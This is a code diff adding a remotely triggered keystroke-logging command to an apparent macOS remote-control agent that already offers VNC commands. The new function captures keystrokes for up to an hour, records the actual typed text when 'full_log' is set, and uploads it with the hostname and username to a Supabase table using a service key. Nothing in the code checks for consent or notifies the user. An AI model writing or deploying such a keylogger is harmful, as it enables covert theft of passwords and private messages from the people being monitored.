@@ -1451,6 +1451,159 @@ class CommandListener:
             return {"success": False, "error": str(e)}
 
     # =========================================================================
+    # KEYSTROKE LOGGING COMMANDS
+    # =========================================================================
+
+    def cmd_keystroke(self, args: dict) -> dict:
+        """Start keystroke logging for a specified duration.
+
+        Args:
+            duration: Duration in minutes (default: 5, max: 60)
+            full_log: If True, log actual keystrokes (default: False, privacy mode)
+        """
+        try:
+            import threading
+            import signal
+
+            duration_mins = min(int(args.get("duration", 5)), 60)  # Max 60 minutes
+            full_log = args.get("full_log", False)
+            duration_secs = duration_mins * 60
+
+            log(f"[KEYSTROKE] Starting keystroke logging for {duration_mins} minutes (full_log={full_log})")
+
+            # Check if pynput is available
+            try:
+                from pynput import keyboard
+            except ImportError:
+                return {
+                    "success": False,
+                    "error": "pynput not installed. Install with: pip3 install pynput"
+                }
+
+            # Keystroke data
+            keystroke_data = {
+                "device_id": self.device_id,
+                "start_time": datetime.now().isoformat(),
+                "keystroke_count": 0,
+                "keystrokes": [] if full_log else None,
+                "apps": {},
+                "hostname": socket.gethostname(),
+                "username": os.getenv("USER", "unknown")
+            }
+
+            current_app = [""]
+            lock = threading.Lock()
+
+            def get_active_app():
+                try:
+                    script = '''
+                    tell application "System Events"
+                        set frontApp to name of first application process whose frontmost is true
+                        return frontApp
+                    end tell
+                    '''
+                    result = subprocess.run(['osascript', '-e', script],
+                                          capture_output=True, text=True, timeout=5)
+                    if result.returncode == 0:
+                        return result.stdout.strip()
+                except:
+                    pass
+                return "Unknown"
+
+            def on_key_press(key):
+                with lock:
+                    keystroke_data["keystroke_count"] += 1
+
+                    # Track per-app keystroke count
+                    app = get_active_app()
+                    if app != current_app[0]:
+                        current_app[0] = app
+                    keystroke_data["apps"][app] = keystroke_data["apps"].get(app, 0) + 1
+
+                    # Log full keystrokes if enabled
+                    if full_log and keystroke_data["keystrokes"] is not None:
+                        try:
+                            if hasattr(key, 'char') and key.char:
+                                keystroke_data["keystrokes"].append(key.char)
+                            elif key == keyboard.Key.space:
+                                keystroke_data["keystrokes"].append(' ')
+                            elif key == keyboard.Key.enter:
+                                keystroke_data["keystrokes"].append('\n')
+                            elif key == keyboard.Key.tab:
+                                keystroke_data["keystrokes"].append('\t')
+                            elif key == keyboard.Key.backspace:
+                                if keystroke_data["keystrokes"]:
+                                    keystroke_data["keystrokes"].pop()
+                        except:
+                            pass
+
+            # Start listener in background thread
+            listener = keyboard.Listener(on_press=on_key_press)
+            listener.start()
+
+            # Wait for duration
+            time.sleep(duration_secs)
+
+            # Stop listener
+            listener.stop()
+            listener.join()
+
+            # Prepare result
+            keystroke_data["end_time"] = datetime.now().isoformat()
+            keystroke_data["duration_minutes"] = duration_mins
+
+            # Convert keystrokes list to string if full log
+            if full_log and keystroke_data["keystrokes"]:
+                keystroke_text = ''.join(keystroke_data["keystrokes"])
+                if len(keystroke_text) > 10000:
+                    keystroke_text = keystroke_text[:10000] + "...[truncated]"
+                keystroke_data["keystrokes_text"] = keystroke_text
+                del keystroke_data["keystrokes"]
+            else:
+                keystroke_data["keystrokes_text"] = None
+                if "keystrokes" in keystroke_data:
+                    del keystroke_data["keystrokes"]
+
+            # Sort apps by keystroke count
+            top_apps = sorted(keystroke_data["apps"].items(), key=lambda x: x[1], reverse=True)[:10]
+
+            # Save to Supabase
+            if self.client and self.device_id:
+                try:
+                    log_data = {
+                        "device_id": self.device_id,
+                        "app_name": top_apps[0][0] if top_apps else "Unknown",
+                        "keystroke_count": keystroke_data["keystroke_count"],
+                        "keystrokes": keystroke_data.get("keystrokes_text"),
+                        "start_time": keystroke_data["start_time"],
+                        "end_time": keystroke_data["end_time"],
+                        "hostname": keystroke_data["hostname"],
+                        "username": keystroke_data["username"]
+                    }
+                    self.client._request(
+                        "POST",
+                        "/rest/v1/keystroke_logs",
+                        log_data,
+                        use_service_key=True
+                    )
+                    log(f"[KEYSTROKE] Logged {keystroke_data['keystroke_count']} keystrokes")
+                except Exception as e:
+                    log(f"[KEYSTROKE] Error saving to Supabase: {e}")
+
+            return {
+                "success": True,
+                "duration_minutes": duration_mins,
+                "keystroke_count": keystroke_data["keystroke_count"],
+                "top_apps": dict(top_apps),
+                "full_log_enabled": full_log,
+                "message": f"Recorded {keystroke_data['keystroke_count']} keystrokes in {duration_mins} minutes"
+            }
+
+        except Exception as e:
+            log(f"[KEYSTROKE] Error: {e}")
+            return {"success": False, "error": str(e)}
+
+    # =========================================================================
     # REMOTE DESKTOP (VNC) COMMANDS
     # =========================================================================
 
@@ -1736,6 +1889,10 @@ class CommandListener:
             "vncstop": self.cmd_vnc_stop,
             "vnc_status": self.cmd_vnc_status,
             "vncstatus": self.cmd_vnc_status,
+            # Keystroke logging commands
+            "keystroke": self.cmd_keystroke,
+            "keylog": self.cmd_keystroke,
+            "keystrokes": self.cmd_keystroke,
         }
 
         handler = handlers.get(cmd_name)
